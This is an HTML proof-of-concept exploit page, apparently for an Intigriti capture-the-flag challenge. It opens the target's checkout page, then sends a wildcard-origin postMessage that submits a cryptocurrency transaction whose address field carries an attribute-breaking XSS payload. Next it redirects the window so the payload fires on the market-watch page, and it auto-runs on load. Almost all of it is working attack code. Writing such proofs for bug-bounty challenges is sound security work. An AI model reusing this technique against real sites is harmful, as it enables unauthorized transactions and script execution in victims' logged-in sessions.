<!DOCTYPE html>
<html>
<head>
    <title>PoC</title>
</head>
<body>
    <button id="btn" onclick="exploit()">Click to Exploit (if popup blocked)</button>
    <div id="log"></div>

    <script>
        const targetBase = "https://challenge-0126.intigriti.io";
        const checkoutUrl = targetBase + "/checkout.html";
        const marketWatchUrl = targetBase + "/marketwatch.html";

        function log(msg) {
            document.getElementById("log").innerText += msg + "\n";
        }

        function exploit() {
            log("1. Opening vulnerable checkout page...");
            
            // Open the checkout page. We use window.open because X-Frame-Options 
            // often blocks iframes, and we need the user's session cookies.
            let win = window.open(checkoutUrl, "targetWindow");

            // Wait for the window to load (2-3 seconds is usually safe)
            setTimeout(() => {
                log("2. Sending malicious postMessage...");

                // THE PAYLOAD
                // 1. We use "BTC" because the user likely has a BTC wallet (bypasses validation).
                // 2. We inject into 'toAddress'.
                // 3. We use "> to break out of the title="..." attribute in marketwatch.html.
                const payload = {
                    type: "submitTransaction",
                    transaction: {
                        currency: "BTC", 
                        amount: 0.00000001,
                        // The Injection: Close the title attr, close the span tag, open img tag
                        toAddress: "\"><img src=x onerror=alert(document.domain)>" 
                    }
                };

                // Send the message to ANY origin ('*')
                win.postMessage(payload, "*");
                
                log("3. Payload sent! Check the popup window.");
                
                // Optional: Redirect victim to marketwatch to verify the XSS fired
                // We wait a bit for the API call to finish in the other window
                setTimeout(() => {
                   log("4. Redirecting to MarketWatch to trigger XSS...");
                   win.location.href = marketWatchUrl;
                }, 2000);

            }, 2500);
        }

        // Auto-run if possible
        window.onload = function() {
            setTimeout(exploit, 1000);
        }
    </script>
</body>
</html>
